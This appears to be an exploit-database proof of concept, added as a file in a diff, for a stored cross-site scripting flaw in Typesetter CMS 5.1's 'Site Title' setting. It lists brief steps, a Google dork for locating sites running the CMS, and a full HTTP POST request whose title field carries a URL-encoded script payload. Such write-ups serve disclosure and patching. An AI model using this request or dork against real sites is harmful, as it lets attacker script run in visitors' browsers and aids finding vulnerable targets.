@@ -1,0 +1,43 @@
+# Exploit Title: Typesetter CMS 5.1 - 'Site Title' Persistent Cross-Site Scripting
+# Exploit Author: Alperen Ergel
+# Web Site: https://alperenae.gitbook.io/
+# Contact: @alperen_ae (IG) @alpren_ae (TW)
+# Software Homepage: https://www.typesettercms.com/
+# Version : 5.1
+# Tested on: windows 10 / xammp
+# Category: WebApp
+# Google Dork: intext:"Powered by Typesetter"
+# Date: 2020-09-29
+# CVE :-
+######## Description ########
+#
+# 1-) Loggin administrator page
+#  
+# 2-) Edit under Settings > Configration >  General Settings > title and add payload
+#
+# 3-) Back to web site then will be work payload
+#
+#
+######## Proof of Concept ########
+
+========>>> REQUEST <<<=========
+
+POST /typesetter/Admin/Configuration HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/typesetter/Admin/Configuration
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 1134
+Connection: close
+Cookie: g=2; gpEasy_bf7bf352c176=zM0WimE3PVwK7QeQaaK88BgSGnOYXfD7d5y7K815; __gads=ID=6078ee5aea85c9aa:T=1600515511:S=ALNI_MaaxxD3-kKm1mS0BDTLxQUBoD-1bw; _ga=GA1.2.862675868.1600515711; __atuvc=3%7C38%2C1%7C39%2C3%7C40; wires_challenge=afzBq%2FHPKhRGhabSML1Jc738JzKxfr4w; _gid=GA1.2.50322462.1601402080
+
+Upgrade-Insecure-Requests: 1
+
+verified=1fe7b252b3aa6f0a3ef412e4d9556f34bce5d15f0433057805e74c41305a2cab2641a4ec81988341275dab33e5f92e8ebd3cf70766f8b9718f835d1e4f5ec78d
+&title=%3Cscript%3Ealert%28%22THIS+IS+XSS+PAYLOAD%22%29%3B%3C%2Fscript%3E&keywords=&desc=&aaa=Save+%28All%29&colorbox_style=example1&gallery_legacy_style=false&language=en&langeditor=inherit&showsitemap=false&showsitemap=true&showlogin=false&showlogin=true
+&showgplink=false&showgplink=true&maximgarea=2073600&resize_images=false&resize_images=true&preserve_icc_profiles=false&preserve_icc_profiles=true&preserve_image_metadata=false&preserve_image_metadata=true&maxthumbsize=300&maxthumbheight=&thumbskeepaspect=false&auto_redir=90&history_limit=30&HTML_Tidy=&Report_Errors=false&combinejs=false&combinejs=true&combinecss=false&combinecss=true&etag_headers=false&etag_headers=true&space_char=-&toemail=cms%40gfdk.org&toname=dsadasda&from_address=AutomatedSender%40localhost&from_name=Automated+Sender&from_use_user=false&require_email=&mail_method=mail&sendmail_path=&smtp_hosts=&smtp_user=&smtp_pass=&recaptcha_public=&recaptcha_private=&recaptcha_language=inherit&cmd=save_config
